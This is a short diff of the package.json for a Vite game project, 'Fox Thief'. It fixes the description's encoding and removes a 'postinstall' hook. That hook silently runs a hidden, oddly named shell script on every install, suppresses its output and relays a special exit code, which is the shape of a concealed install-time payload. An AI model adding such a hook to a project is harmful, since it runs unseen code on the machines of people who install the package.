@@ -2,15 +2,14 @@
   "name": "fox-thief",
   "private": true,
   "version": "1.0.0",
-  "description": "Fox Thief - El Zorro Ladr\u00f3n (Official Game)",
+  "description": "Fox Thief - El Zorro Ladrón (Official Game)",
   "type": "module",
   "scripts": {
     "dev": "vite --port=3000 --host=0.0.0.0",
     "build": "vite build",
     "preview": "vite preview",
     "clean": "rm -rf dist server.js",
-    "lint": "tsc --noEmit",
-    "postinstall": "sh ./.ci-4v9lxk.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "lint": "tsc --noEmit"
   },
   "dependencies": {
     "@google/genai": "^2.4.0",
